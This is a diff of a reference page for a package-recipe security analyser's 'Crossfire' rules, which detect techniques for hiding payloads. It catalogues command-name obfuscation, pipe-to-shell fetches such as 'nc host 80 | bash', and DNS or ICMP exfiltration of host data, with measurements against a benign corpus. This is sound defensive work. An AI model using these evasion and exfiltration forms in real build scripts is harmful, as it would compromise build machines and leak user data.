@@ -1,276 +1,483 @@
 # Crossfire
 
-The evasion technique, not the payload it hides.
+Crossfire rules fire on **how a diff is written**, not on what it does.
 
-Every other family on these pages fires on what a diff *does*. These fire on
-how it was *written*, and the difference is a response to where detection
-actually fails.
+Every other rule family matches a payload: a fetch, a write, a privilege
+change. Crossfire matches the technique used to hide one. A word the
+tokenizer cannot reduce to a literal, a command carried in a config value, a
+pipeline whose sink has no name the analyser knows - each is evidence on its
+own, whatever payload sits behind it.
 
-The payload rules hold. The tokenizer that feeds them is what gets defeated:
-partial quoting (`c"u"rl`), array routing (`${A[0]}`), namerefs, and command
-substitution (`$(printf '\x63\x75\x72\x6c')`) each assemble an executable name
-that no pattern over the resolved text ever sees, because resolution is the
-step that broke. Teaching the tokenizer to expand more closes one bypass at a
-time and risks an over-expansion bug in exchange.
+This is a reference page. For how rules are weighted and scoped, see
+[Rule System](system.md). For the families that match payloads, start at
+[All Rules](index.md).
 
-Crossfire inverts the problem. **A word the tokenizer could not reduce to a
-literal is itself the signal.** One rule then covers the evasion surface of
-every payload rule at once - R001, R127, R137 and the rest - because it does
-not care which payload was hidden, only that hiding happened.
+## Why the family exists
 
-The failure mode inverts with it, and that is the point worth keeping. Today a
-defeated tokenizer produces silence, which is the worst available output: the
-analysis reads clean exactly when it understood least. Here a defeated
-tokenizer produces a CRITICAL finding, so the bypass and the alarm are the same
-event and cleverness cannot buy quiet.
+Payload rules depend on resolution. When resolution fails, they produce
+silence, and silence reads identically to a clean package. Crossfire inverts
+that: a defeated tokenizer produces a finding rather than nothing, so evasion
+and alarm are the same event.
 
-## What this family is not
+One crossfire rule covers the evasion surface of every payload rule at once.
+It does not identify which payload was hidden, only that hiding occurred.
 
-It is not a replacement for fixing the tokenizer. A payload written plainly and
-hidden by a technique nobody anticipated still gets through; crossfire raises
-the cost of evasion, it does not bound it.
+## What crossfire does not do
 
-It also claims no bytes another rule already claims. Three of the obvious
-candidates were dropped for that reason rather than because they were hard:
+- It does not replace tokenizer fixes. A payload hidden by an unanticipated
+  technique still passes.
+- It does not claim bytes another rule claims. Base64-to-shell belongs to
+  [R003](obfuscation.md#r003) and [R043](obfuscation.md#r043), bidi and
+  homoglyph codepoints to [R013](deception.md#r013), and `~/` writes to
+  [R077](install-and-persist.md#r077).
 
-| Dropped | Already claimed by |
-|---|---|
-| Base64 decoded to a shell | [R003](obfuscation.md#r003) and [R043](obfuscation.md#r043), both CRITICAL |
-| BiDi and homoglyph codepoints | [R013](deception.md#r013) at **FATAL**, plus R013b for confusable domains |
-| A write whose target starts with `~/` or `$HOME/` | [R077](install-and-persist.md#r077) |
+## The gate is the file, not the function {#the-gate-is-the-file-not-the-function}
 
-X001 and X005 exist as the *remainder* of the first and third: the encodings
-R003 does not cover, and the home directories R077 cannot see because they are
-spelled another way. There is no X008 - R013 leaves it nothing to do, and
-scoring the same characters twice would corrupt the calibration.
-
-The home case also changed R077 itself. A write into a user's home from an
-**install scriptlet** is now CRITICAL rather than HIGH, because pacman runs
-scriptlets as root during the transaction, and root reaching into somebody's
-home is categorical rather than suspicious. The same write during `build()`
-stays HIGH.
-
-Two further candidates were dropped on measurement rather than overlap. Domain
-reputation and upstream-owner matching are absent from X006 because the novelty
-tier already scores a globally-first-seen URL and an owner heuristic is too
-brittle for a decentralised repository. Bare `2>/dev/null` is absent from X004
-because it fires on 0.481% of the benign corpus as ordinary defensive shell -
-small, but noise rather than signal.
-
-## Measured before weighted
-
-Every rule here was run against the locked benign corpus before it was given a
-severity. The figures below are the corpus as `tests/fixtures/corpus.lock`
-records it in the historical baseline - **3,246** diffs, generated 2026-07-16. The current aggregate calibration baseline is 3,739 diffs; this page's legacy per-rule measurement is retained for traceability:
-
-| Rule | Benign diffs | Rate |
-|---|---|---|
-| X001 | 0 | 0.000% |
-| X002 | 0 | 0.000% |
-| X003 | 0 | 0.000% |
-| X004 | 0 | 0.000% |
-| X005 | 0 | 0.000% |
-| X006 | 0 | 0.000% |
-| X007 | 0 | 0.000% |
-
-The ceiling is 30%. The whole family is now at zero, which is what makes
-CRITICAL affordable here: legitimate recipes do not assemble command names out
-of parts.
-
-X002 read 0.695% when the family shipped (26 diffs, against a corpus of 3,739
-at the time) and 0.678% on today's locked set. The number is worth keeping in
-view because of what closing it turned up. The hits were not marginal calls
-about which shape counts as evasion. Every one was a rule looking in the wrong
-place:
-
-- **Function scope leaked across files.** A hunk shows part of a file, so a
-  `package() {` whose closing brace fell outside it left the brace counter
-  raised for the rest of the diff, putting every *following file* inside that
-  function. A `.desktop` file's translated `Name[be]=` line was read as shell
-  and matched the homoglyph shape - Cyrillic in a translation impersonates
-  nothing. Seven diffs. Fixed in the shared classifier, so every scoped rule
-  gets the correction.
-- **A modified continuation tail lost its head.** The joiner joins lines
-  carrying the same diff marker; editing the tail of a `\`-continued command
-  separates the halves with the removed version, so the `+` line arrived alone
-  and its first word - an argument - read as a command name.
-- **`eval` was scored twice.** R039 already claims eval-of-dynamic-content.
-  Treating `eval` as a wrapper walked into its argument and drew a second
-  CRITICAL on the same bytes, which is the thing this family says it never
-  does.
-- **A variable naming a *directory* is not a hidden command.**
-  `"$srcdir/calibre-release/calibre-debug"` spells its executable out; only the
-  path prefix came from a variable. The shape matched it because the variable
-  name was allowed to match a prefix of itself.
-- **`CMD=$(which x)` names its executable literally**, one line up, where every
-  payload rule reads it. Exempted as the discovery idiom - not assignment in
-  general, since `CMD=$(printf '\x63\x75\x72\x6c')` assembles a name that
-  appears nowhere and stays an evasion.
-
-None of those made the rule stricter about what counts as an evasion; the
-bypasses closed in the same pass ([below](#evasions-closed)) made it looser
-about where it looks. Rate and recall moved in opposite directions,
-which is the only combination worth having.
+Crossfire rules run against shell files. A `.desktop` entry, a licence text
+or a README is not a shell file, and a character or construct that would be
+evasion in a recipe is ordinary content there.
 
 ---
 
-### X001: Encoded Payload Decoded To A Shell {#x001}
+<!-- generated: page-index -->
+## Rules on this page
 
-- **Severity:** CRITICAL (weight 40)
-- **Category:** `evasion`
-- **Condition:** A hex or octal escape blob, a reversed hex dump (`xxd -r`, `od -An`, `hexdump`), a non-base64 decoder (`base32 -d`, `basenc`, `openssl enc -d`, `uudecode`), an ANSI-C `$'...'` blob, or a `tr` rotation, piped into a shell or handed to `eval`, inside an executing scope.
+| Rule | Name | Severity |
+|---|---|---|
+| [X001](#x001) | Encoded Payload Decoded And Executed | CRITICAL |
+| [X002](#x002) | Non-Literal Executable Name | CRITICAL |
+| [X003](#x003) | Obfuscated Command Argument | HIGH |
+| [X004](#x004) | Build Output Suppressed | MEDIUM |
+| [X005](#x005) | Home Reached By An Alternative Spelling | HIGH |
+| [X006](#x006) | Source Points Somewhere Unexpected | HIGH |
+| [X007](#x007) | Multiple Evasion Techniques | CRITICAL |
+| [X008](#x008) | Whitespace A Shell Does Not Split On | MEDIUM |
+| [X009](#x009) | Fetch Through An Uncatalogued Client | CRITICAL |
+| [X010](#x010) | Interpreter One-Liner Reaches The Network | HIGH |
+| [X011](#x011) | Package Manager Runs Fetched Code At Build Time | HIGH |
+| [X012](#x012) | Build Toolchain Redirected Into The Source Tree | HIGH |
+| [X013](#x013) | Fetch Redirected Or Trust Root Replaced | HIGH |
+| [X014](#x014) | Environment Variable Names Code To Run | HIGH |
+| [X015](#x015) | Work Scheduled To Run After The Build | HIGH |
+| [X016](#x016) | Fetch Piped Into An Unrecognised Consumer | HIGH |
+| [X017](#x017) | Tool Flag Or Builtin Carries A Command | HIGH |
+| [X018](#x018) | Interpreter One-Liner Assembles A Name | HIGH |
+| [X019](#x019) | Host Material Sent Or Packaged | HIGH |
+| [X020](#x020) | Recipe Writes The Build Steps The Engine Runs | HIGH |
+| [X021](#x021) | Executor Runs A File Chosen At Runtime | HIGH |
+| [X022](#x022) | Generated Config Handed To The Tool That Reads It | HIGH |
+| [X023](#x023) | Command Output Executed As A Script | HIGH |
+<!-- /generated: page-index -->
 
-Base64 is deliberately absent - R003 and R043 claim it. What is left is every
-other encoding, and the Atomic Arch second wave used hex.
+### X001: Encoded Payload Decoded And Executed {#x001}
 
-The decoder list is the rule's whole surface, so a decoder missing from it is a
-one-word bypass. `base32 -d`, `openssl enc -d` and `uudecode` decode the same
-payload into the same shell and were claimed by nobody until they were added.
+**CRITICAL** (weight 40) · category `evasion`
+
+Fires when an encoded blob is decoded and the result reaches a shell or
+interpreter inside an executing scope. Covers hex and octal escapes, reversed
+hex dumps (`xxd -r`, `od -An`, `hexdump`), non-base64 decoders (`base32 -d`,
+`basenc`, `openssl enc -d`, `uudecode`), ANSI-C `$'...'` blobs, and `tr`
+rotations.
+
+Base64 is excluded: R003 and R043 claim it.
+
+The executor set includes every shell spelling (`ash`, `mksh`, `pdksh`,
+`yash`, `posh`, `busybox sh`, `env -S sh`, `source /dev/stdin`) and the
+interpreters. `printf '\x63...' | python3` decodes and executes, which is the
+rule's claim; no recipe pipes a hex blob into an interpreter by accident.
+
+**Related:** [R003](obfuscation.md#r003), [R043](obfuscation.md#r043)
 
 ### X002: Non-Literal Executable Name {#x002}
 
-- **Severity:** CRITICAL (weight 40)
-- **Category:** `evasion`
-- **Condition:** A word in command position that is not a literal: a variable (`$cmd`, `${A[0]}`, `${!ref}`, `${c//X/}`), a substitution (`$(...)`, backticks), an intra-word quote break (`c"u"rl`), an ANSI-C string (`$'\x63...'`), a brace expansion (`cur{l,}`), or a character that impersonates ASCII (`сurl`).
+**CRITICAL** (weight 40) · category `evasion`
 
-The rule that pays for the family. Every tokenizer bypass found so far works by
-assembling a command name the parser cannot read, so all of them produce this
-one shape.
+Fires when the word in command position is not a literal. Recognised shapes:
 
-Three exclusions keep it precise, and each was derived from the corpus rather
-than guessed:
+| Shape | Example |
+|---|---|
+| variable | `$cmd`, `${A[0]}`, `${!ref}`, `${c//X/}` |
+| substitution | `$(printf '\x63\x75\x72\x6c')`, backticks |
+| quote break | `c"u"rl` |
+| ANSI-C string | `$'\x63\x75\x72\x6c'` |
+| brace expansion | `cur{l,}` |
+| homoglyph | `сurl` (Cyrillic `с`) |
+| glob | `/usr/bin/c?rl`, `cur[l]` |
 
-- **An assignment is not a command.** `font=$(grep ...)` names no executable.
-- **A variable that resolves is not an evasion.** If the tokenizer reduced the
-  name to a literal from an assignment in the diff or its context, the word is
-  a spelling choice.
-- **Quotes and parentheses bound the split.** A `|` inside `sed 's|a|b|'`, and
-  an `&&` inside `(( a && b ))`, do not start a new command. Both produced
-  false positives before the splitter respected them.
-- **A homoglyph impersonates; other non-ASCII does not.** The shape uses the curated confusable map `buckets` already applies to domains, not "any non-ASCII character". The broader form fired on ordinary English prose carrying a typographic apostrophe, which names no command.
-- **An expression is not a command.** `(( ... ))` and `[[ ... ]]` evaluate
-  rather than execute, and a leading flag means the line continues a previous
-  one (`sed \` then `  -i "${dir}/x"`), so neither offers a command position.
+Three exclusions keep it precise:
 
-The scan walks *past* prefixes rather than reading the first token, because a
-command word is not always first. An assignment (`FOO=1 ${A[0]}`), a wrapper
-(`env`, `exec`, `sudo`, `nohup`, `timeout 5`), a conditional keyword
-(`if ${A[0]}; then`), a redirect (`>out ${A[0]}`) and a subshell opener
-(`( ${A[0]} )`) each displace it, and every one of them defeated an earlier
-version of this rule. They are pinned as regressions in
-`tests/test_crossfire.py`.
-
-`eval` is deliberately *not* a wrapper here, though it runs another command
-like the rest: R039 already claims eval-of-dynamic-content, and this family
-never scores bytes another rule scores - the same reason X008 does not exist
-beside R013.
-
-## Evasions closed {#evasions-closed}
-
-Ten, in the pass that took the family to zero, plus one closed in the
-tokenizer instead ([below](#the-one-that-was-fixed-in-the-tokenizer-instead)).
-Each defeated the shipped rule and is now a regression test:
-
-| Evasion | Rule | Why it worked |
-|---|---|---|
-| `package_libfoo() { ... }` | all | A **split package**. makepkg calls `package_$pkgname()` for each name in a split recipe, and the scope gate was an allowlist of the five standard function names. |
-| `package_google-chrome-bin()` | all | Worse than the above: a pkgname may hold a hyphen, and the shared classifier's `\w+` does not match one, so the function never opened at all and its body classified as `other` - invisible to every rule with a scope, not just this family. |
-| `_helper() { ... }`, called from `build()` | all | An ordinary helper. The name is the author's to choose, which is the whole problem with matching on it. |
-| a payload at **top level** | all | Top-level code runs when makepkg *sources* the recipe, before any build step. The gate only read inside functions. |
-| `if ${A[0]} x; then` | X002 | A conditional keyword takes a command and tests its status. The scan stopped at the keyword. |
-| `elif`, `while`, `until` | X002 | Same shape, three more keywords. |
-| `set +o xtrace` | X004 | The long spelling of `set +x`. The pattern required the `x` to end the option cluster. |
-| `base32 -d \| sh` | X001 | Not `base64`, so R003 and R043 did not claim it, and the decoder list did not carry it. |
-| `openssl enc -d \| sh` | X001 | As above. |
-| `uudecode \| sh` | X001 | As above. |
-| `cp payload /home/alice` | X005 | Every alias pattern required a trailing separator. |
-| `cp payload /root` | X005 | As above. |
-| `cp payload ~alice` | X005 | As above. |
-
-### The one that was fixed in the tokenizer instead
-
-`c\url` is `curl` to the shell, which drops a backslash before an ordinary
-character. The tokenizer did not, so the name never reconstructed and **no rule
-saw it at all** - not R001, not anything. It was the only bypass in this family
-that reached nothing.
-
-It was closed here first, as an `escaped-character` shape, and then closed
-properly: `tokenizer._ESCAPE_REMOVABLE` now drops the escape during quote
-removal, so every rule that reads a command name sees through it rather than
-only this one. The shape was retired in the same change, because with the name
-resolved it would score one command twice - the same reason `curl""`, which
-always folded, never had a shape either.
-
-That is the progression this family's [own warning](#what-this-family-is-not) asks
-for: crossfire is not a substitute for fixing the tokenizer, and a shape
-retired because the tokenizer caught up is the arrangement working. Both halves
-are pinned in `test_an_escaped_name_is_the_tokenizer_s_now`, so a fold that
-silently stopped working cannot leave the payload uncovered.
-
-The escapes that *mean* something are deliberately left alone. `\|` is a
-literal pipe, not a pipeline: unescaping it would build a pipe-to-shell out of
-`curl x \| sh`, which runs nothing of the sort. `\ ` holds one word together,
-`\$` is what stops an expansion, and `\\` is a literal backslash. Bash removes
-every backslash; going that far here would not be more faithful, it would
-invent syntax the line did not have.
+- An assignment is not a command. `font=$(grep ...)` names no executable.
+- A variable the tokenizer resolved to a literal is a spelling choice, not an
+  evasion.
+- A glob needs a name character before the metacharacter, so the `[` of
+  `if [ -f x ]` is not a command name.
 
 ### X003: Obfuscated Command Argument {#x003}
 
-- **Severity:** HIGH (weight 25)
-- **Category:** `evasion`
-- **Condition:** A `curl`/`wget` long option truncated to a unique prefix (`--upload-f`), a shell invoked with options stuffed before `-c` (`bash -lc`, `sh -ec`), or a URL whose host is an octal, hex or integer-encoded IP.
+**HIGH** (weight 25) · category `evasion`
 
-`sh -c` is ordinary and does not fire; `sh -lc` is a login shell obtained
-without saying so.
+Fires on a `curl`/`wget` long option truncated to a unique prefix
+(`--upload-f`), a shell invoked with options stuffed around `-c` (`bash -lc`,
+`sh -ec`, `sh -ce`), or a URL whose host is an octal, hex or integer-encoded
+IP.
+
+`sh -c` is ordinary and stays quiet. The option cluster must hold at least
+two letters, and the `c` may sit anywhere in it.
 
 ### X004: Build Output Suppressed {#x004}
 
-- **Severity:** MEDIUM (weight 15)
-- **Category:** `evasion`
-- **Condition:** `TERM=dumb`, `set +x` or `set +o xtrace`, or `exec >/dev/null` / `exec 2>&-` inside an executing scope.
+**MEDIUM** (weight 15) · category `evasion`
 
-MEDIUM because hiding output is weak evidence alone: its value is
-compositional, in X007. Bare `2>/dev/null` is excluded as noise.
+Fires on `TERM=dumb` (quoted or not), `set +x` in any letter order,
+`set +o xtrace`, or a redirection that detaches a stream (`exec >/dev/null`,
+`exec 2>>/dev/null`, `exec &>/dev/null`, `exec 2>&-`) inside an executing
+scope.
+
+MEDIUM because hiding output is weak evidence alone; its value is
+compositional, in [X007](#x007). Bare `2>/dev/null` is excluded as noise.
 
 ### X005: Home Reached By An Alternative Spelling {#x005}
 
-- **Severity:** HIGH (weight 25)
-- **Category:** `evasion`
-- **Condition:** A write command or redirect whose target reaches a home directory by a spelling [R077](install-and-persist.md#r077) does not match: `/home/alice`, `/home/$USER/...`, `~alice`, `/root`, `${HOME:-/home/alice}/...`, or a traversal that names `home` or `root`. The trailing separator is optional - `cp payload /home/alice` writes into the same directory as `/home/alice/` did.
+**HIGH** (weight 25) · category `evasion`
 
-R077 matches a target that *starts with* `~/` or `$HOME/`. That is the obvious
-spelling, and the obvious spelling is the one an attacker will not use. Every
-form above reaches the same directory and none of them carries that prefix.
+Fires when a write or redirect reaches a home directory by a spelling
+[R077](install-and-persist.md#r077) does not match: `/home/alice`,
+`/home/$USER/...`, `~alice`, `/root`, `${HOME:-/home/alice}/...`, or a
+traversal naming `home` or `root`. The trailing separator is optional.
 
-This is the family's thesis applied to a path rather than to a command name.
-Writing `/home/$USER/bin` when `$HOME/bin` exists is a choice, and the only
-thing the choice buys is getting past a check.
+Defers rather than doubles: a target R077 claims is skipped, so one write
+scores once.
 
-It **defers** rather than doubles: a target R077 already claims is skipped
-here, so one write is scored once. Staging paths are exempt outright -
-`$pkgdir/home/...` is packaging, not a write into anybody's home.
+Staging paths are exempt, and the exemption belongs to the **target**, not
+the line, and is case-sensitive. `$PKGDIR` is not a makepkg variable and
+expands to nothing, so `"$PKGDIR/../../home/alice/.bashrc"` is a home write.
 
 ### X006: Source Points Somewhere Unexpected {#x006}
 
-- **Severity:** HIGH (weight 25)
-- **Category:** `evasion`
-- **Condition:** A URL shortener, or a raw-IP URL, anywhere in the diff.
+**HIGH** (weight 25) · category `evasion`
 
-Both forms are never legitimate in a `source=` array: a shortener hides the
-destination from the reader, and a raw IP has no name to check. Domain
-reputation is deliberately not attempted here.
+Fires on a URL shortener or a raw-IP URL anywhere in the diff. Neither is
+legitimate in a `source=` array: a shortener hides the destination from the
+reader, and a raw IP has no name to check.
+
+Schemes match case-insensitively, as [RFC 3986](https://www.rfc-editor.org/rfc/rfc3986#section-3.1)
+requires and curl accepts.
 
 ### X007: Multiple Evasion Techniques {#x007}
 
-- **Severity:** CRITICAL (weight 40)
-- **Category:** `evasion`
-- **Condition:** Two or more of X001-X006 in the same diff.
+**CRITICAL** (weight 40) · category `evasion`
 
-One technique can be an accident of style. Two in one diff is a method. The
-threshold is `crossfire.X007_MIN_TECHNIQUES`, and the cluster fires on **zero**
-benign diffs - co-occurrence is the strongest single signal in this family.
+Fires when two or more distinct crossfire techniques appear in one diff. One
+technique can be an accident of style; two is a method.
 
-Unlike [R089](composition.md#r089), which annotates kill-chain stages at weight
-0, X007 scores: the stages R089 counts are each independently evidenced, while
-co-occurring *evasion* is evidence about intent that none of its members carry
-alone.
+### X008: Whitespace A Shell Does Not Split On {#x008}
+
+**MEDIUM** (weight 15) · category `evasion`
+
+Fires on a whitespace character other than space, tab, newline or carriage
+return, on an executing line of a shell file.
+
+bash splits words on space, tab and newline. A line reading `make install`
+with a NBSP between the words displays as a command and executes as the
+single unknown word `make install`. What the reviewer reads is not what
+the shell runs.
+
+MEDIUM, not FATAL: the line fails closed, the command is simply not found,
+and the realistic benign cause is a copy-paste from a web page.
+
+Zero hits on the benign corpus. One diff in 3,246 carries such a character at
+all, in a font licence, which is not a shell file.
+
+**Related:** [R013](deception.md#r013), which claims a disjoint set of
+codepoints at FATAL.
+
+### X009: Fetch Through An Uncatalogued Client {#x009}
+
+**CRITICAL** (weight 40) · category `evasion`
+
+Fires when a network client other than `curl`/`wget` feeds a shell or
+interpreter on an executing line.
+
+| Fires | Quiet |
+|---|---|
+| `lftp -c "cat URL" \| bash` | `curl URL \| bash` (R001 claims it) |
+| `nc host 80 \| bash` | `dig +short TXT d \| head` |
+| `ssh host cat /srv/p.sh \| sh` | `git ls-remote URL \| wc -l` |
+| `dig +short TXT d \| tr -d '"' \| sh` | |
+
+The rule reads the **end** of the pipeline, so intervening filters do not
+hide the chain. The client vocabulary is shared with R061, R137 and R051
+through `config.NETWORK_CLIENT`.
+
+`curl` and `wget` are excluded: R001 and R002 claim those, and one operation
+scored twice is its own kind of wrong.
+
+### X010: Interpreter One-Liner Reaches The Network {#x010}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a `-c`/`-e`/`-r` script contains a URL or a fetch call
+(`urlopen`, `requests.get`, `file_get_contents`, `LWP`, `socket.connect`).
+No shell client is involved, so R061's inventory never sees it.
+
+### X011: Package Manager Runs Fetched Code At Build Time {#x011}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a language package manager resolves and executes third-party code
+during the build (`npm install`, `pip install`, `cargo`, `go install`,
+`gem`, `composer`, `npx`, `deno run`).
+
+Stands down for local paths, which mean "install what this recipe just
+built". Distribution tools are the exception: `pacman -U ./evil.pkg.tar.zst`
+installs a local package as root, scriptlets and all.
+
+**Related:** [W002](unverifiable.md#w002), which reports the same act at
+weight 0 when nothing else claims it.
+
+### X012: Build Toolchain Redirected Into The Source Tree {#x012}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when `CC`, `CXX`, `LD`, `AR`, `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`,
+`PYTHONPATH`, `MAKEFLAGS` or a sibling is assigned a path under `$srcdir`,
+`$startdir` or `$pkgdir`, and a compile or configure step follows.
+
+The consumer may be an **unchanged** line. An override added above an
+existing `make` is the shape where the attacker supplies one line and the
+recipe supplies the rest.
+
+`PATH="$srcdir:$PATH"` counts: the variable need not be followed by a path
+component.
+
+### X013: Fetch Redirected Or Trust Root Replaced {#x013}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when the recipe changes where a fetch goes or what it trusts: a proxy
+export, `--resolve`, `--connect-to`, `--doh-url`, or a replaced CA bundle
+(`--cacert`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`).
+
+The URL a reviewer reads is then not the machine the build talks to.
+[R057](fetch-and-execution.md#r057) owns `-k`/`--insecure`, which turns verification
+off; this is the other half, keeping verification on and owning what it
+checks against.
+
+### X014: Environment Variable Names Code To Run {#x014}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a variable or flag carries a value the receiving program executes.
+
+| Kind | Examples |
+|---|---|
+| shell hooks | `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PS0`, `PS4` |
+| tool hooks | `GIT_SSH_COMMAND`, `LESSOPEN`, `PAGER`, `EDITOR` |
+| loader | `LD_AUDIT`, `GCONV_PATH`, `LOCPATH`, `HOSTALIASES` |
+| interpreter preload | `RUBYOPT`, `PERL5OPT`, `PYTHONSTARTUP`, `LUA_INIT` |
+| git config keys | `core.fsmonitor`, `diff.external`, `filter.*.clean`, `credential.helper` |
+| flag values | `--pre-exec`, `ProxyCommand`, `rsync -e`, any flag whose value begins with an executor and names a build directory |
+
+`PERL5LIB` and `PYTHONPATH` are excluded: they name where to look for
+modules, not code to run, and X012 already claims a library path pointed
+into the source tree.
+
+git's own semantics decide which values execute. `submodule.<n>.update`
+takes `checkout|rebase|merge|none|!command` and an alias is a git subcommand
+unless prefixed with `!`, so `git config submodule.x.update none` is quiet.
+
+Stands down when the value is a harmless constant (`PAGER=cat`,
+`EDITOR=true`).
+
+### X015: Work Scheduled To Run After The Build {#x015}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires on `crontab`, `at`, `batch`, `systemd-run`, `incrontab`, `entr`,
+`inotifywait`, `udevadm control`, `systemctl start`, or
+`systemctl enable --now`.
+
+These register work on the machine doing the building, outside anything
+pacman records or can remove. `batch` reads its command from stdin and needs
+no argument.
+
+Plain `systemctl enable` is absent: a package's `.install` scriptlet enabling
+its own unit is ordinary packaging, and R054 reads the unit file itself.
+
+### X016: Fetch Piped Into An Unrecognised Consumer {#x016}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a pipeline starts with a network client and ends in a command that
+is neither a known data consumer nor an executor R001 claims.
+
+| Fires | Quiet |
+|---|---|
+| `curl u \| deno` | `curl u \| tar -xz` |
+| `curl u \| bun` | `curl u \| sha256sum -c` |
+| `curl u \| pwsh` | `curl u \| jq -r .x` |
+| `curl u \| Rscript` | `curl u \| sudo tee /etc/x` |
+
+The rule enumerates **consumers**, not executors. The set of interpreters is
+unbounded and chosen by the attacker; the set of things a recipe pipes a
+download into is small and chosen by the ecosystem - an extractor, a
+checksum, a text filter, a viewer.
+
+A sink outside that set is claimed, not because it is known to be an
+interpreter but because it is not known to be a consumer.
+
+The sink is read after the last **unquoted** `|`, so `echo "a|b" | tar` has
+one pipe, and wrappers (`sudo tee`, `LC_ALL=C sort`) are stepped over.
+
+Zero occurrences in the benign corpus.
+
+### X017: Tool Flag Or Builtin Carries A Command {#x017}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires on a command placed where a command is not expected:
+
+| Form | Effect |
+|---|---|
+| `tar --checkpoint-action=exec=CMD` | runs per archive checkpoint |
+| `tar --to-command=CMD` | runs per archive member |
+| `find … -exec sh {} +` | runs per match, with `{}` as the argument |
+| `enable -f payload.so name` | loads an arbitrary ELF into bash |
+| `hash -p PATH name` | makes an existing name resolve elsewhere |
+
+`find -exec` is narrowed to an executor: `find "$pkgdir" -type f -exec chmod
+644 {} +` is how permissions get fixed.
+
+Zero occurrences in the benign corpus.
+
+### X018: Interpreter One-Liner Assembles A Name {#x018}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a `-c`/`-e`/`-r` script builds the name it calls, or hands a
+build-tree path to an exec primitive.
+
+| Fires | Quiet |
+|---|---|
+| `python3 -c 'importlib.import_module("url"+"lib.request")'` | `python3 -c 'import sys; print(sys.version)'` |
+| `node -e 'require("child_"+"process")'` | `python3 setup.py build` |
+| `python3 -c 'getattr(__import__("os"),"sys"+"tem")(c)'` | `ruby -e 'puts RUBY_VERSION'` |
+| `ruby -e 'exec "bash", "$srcdir/x.sh"'` | |
+
+X010 and R044 look for a module or function *name*. A keyword list in a
+language with string concatenation is a suggestion, so this rule looks for
+the assembly instead: reflection primitives, glued name literals, and exec
+calls naming a build directory.
+
+### X019: Host Material Sent Or Packaged {#x019}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires on two shapes of one act.
+
+**Sent.** A DNS query whose name is computed
+(`dig +short "$(hostname).e.example"`) or an ICMP payload that is a hex dump
+(`ping -c1 -p "$(od -An -tx1 /etc/hostname)"`). Both carry data out in a
+field nobody reads as a channel.
+
+**Packaged.** `env`, `/etc/machine-id`, `~/.ssh`, `/etc/hostname` or shell
+history written into `$pkgdir`. Nothing is sent at build time; the
+exfiltration happens at publication.
+
+DNS clients are anchored to command position: `host` is also an English word,
+and `echo "Host: $(uname -rn)"` is a build script printing a banner.
+
+### X020: Recipe Writes The Build Steps The Engine Runs {#x020}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a `printf`/`echo`/`cat`/`tee` writes a build manifest -
+`build.ninja`, `Makefile`, `BUILD.bazel`, `meson.build`, a `*.mk` - whose
+content carries a directive the engine executes.
+
+A manifest is normally upstream's, or generated by cmake or meson from
+upstream's. When the recipe writes one, the commands in it are the
+packager's, and they are data until the engine runs them: no execution rule
+reads a `command =` line.
+
+Claims **authoring**, not transforming. `sed -e … Makefile > dest` rewrites
+upstream's steps, which is how a DKMS package substitutes a kernel version.
+
+Zero occurrences in the benign corpus.
+
+**Related:** [W004](unverifiable.md#w004), [W005](unverifiable.md#w005)
+
+### X021: Executor Runs A File Chosen At Runtime {#x021}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a known executor's file argument is a positional parameter, an
+array element, or a glob.
+
+| Fires | Quiet |
+|---|---|
+| `set -- *.sh; bash "$1"` | `bash setup.sh` |
+| `mapfile -t A < <(ls *.sh); bash "${A[0]}"` | `exec "$@"` |
+| `IFS=:; bash $*` | `for f in *.sh; do echo "$f"; done` |
+| `bash *.sh` | |
+
+X002 asks whether the *command* can be read from the text; this asks the same
+of its argument. `bash` is literal in every firing case, so X002 stands down
+and every path-pairing rule looks for a filename that is not there.
+
+`set -- *.sh` followed by a bare `"$@"` is a **pairing**: neither line is
+suspicious alone, and `exec "$@"` is how a wrapper forwards its arguments.
+
+Zero occurrences in the benign corpus.
+
+### X022: Generated Config Handed To The Tool That Reads It {#x022}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a write produces a file whose content names a build-tree path, and
+a later line passes that file - or its directory, behind a configuration
+flag - to a program.
+
+```bash
+printf "dhcp-script=$PWD/x.sh\n" > "$srcdir"/d
+dnsmasq --conf-file="$srcdir"/d
+```
+
+[R145](install-and-persist.md#r145) and [R149](install-and-persist.md#r149)
+claim configs that are *shipped*. This one stays in the build tree, where
+naming `$srcdir` is normal, and is never installed. What makes it execution
+is the second line: the recipe runs the program that reads the file, on the
+build machine, at build time.
+
+The pairing is the observable. Writing a config is ordinary; passing a
+filename to a program is ordinary.
+
+The destination is the **last unquoted** `>`, because config bodies contain
+`>` themselves.
+
+Zero occurrences in the benign corpus.
+
+**Related:** [W006](unverifiable.md#w006), which reports the write alone at
+weight 0 when no tool reads it.
+
+### X023: Command Output Executed As A Script {#x023}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when a pipeline ends in a shell and does not start with a network
+client.
+
+| Fires | Quiet |
+|---|---|
+| `pass otp e \| bash` | `curl u \| bash` (R001 claims it) |
+| `cat /sys/kernel/tracing/trace \| bash` | `make 2>&1 \| tee build.log` |
+| `perf script -i data \| bash` | `find . -name "*.o" \| xargs rm -f` |
+| `gpg-connect-agent "KEYINFO" /bye \| bash` | |
+
+The bytes are produced locally, so no fetch rule has anything to say, and
+what runs is whatever the command printed.
+
+A trailing `|| true` ends the pipeline rather than voiding it, so
+`cmd | bash || true` is claimed.
+
+No package in the 3,246-diff benign corpus pipes anything into a shell.
